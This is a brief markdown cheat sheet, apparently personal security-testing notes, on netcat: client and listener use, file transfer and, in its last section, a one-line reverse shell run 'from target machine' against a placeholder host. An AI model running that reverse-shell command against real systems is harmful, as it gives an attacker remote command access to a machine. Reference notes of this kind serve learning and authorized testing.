# Netcat

Detailed cheat sheet available here: [https://www.sans.org/security-resources/sec560/netcat_cheat_sheet_v1.pdf](https://www.sans.org/security-resources/sec560/netcat_cheat_sheet_v1.pdf)

`nc` can be used as shorthand for `netcat` on some machines.

## Basic Client

I.e. connect to an arbitrary port on an IP address:

```bash
$ nc [IP] [PORT]
```

## Basic Listener

I.e. receive connections on an arbitrary port:

```bash
$ nc -lp [PORT]
```

## File Transfer

Setup a listener on host that pushes to an outfile:

```bash
$ nc -lp [PORT] > /path/to/outfile
```

From the client (remote machine), push a file back to the listener:

```bash
$ nc -w3 [IP] [PORT] < /path/to/infile
```

## Send a Reverse Shell

From target machine:

```bash
$ nc [HOST_IP] [PORT] -e /bin/bash
```

# Tags

#cheat-sheet 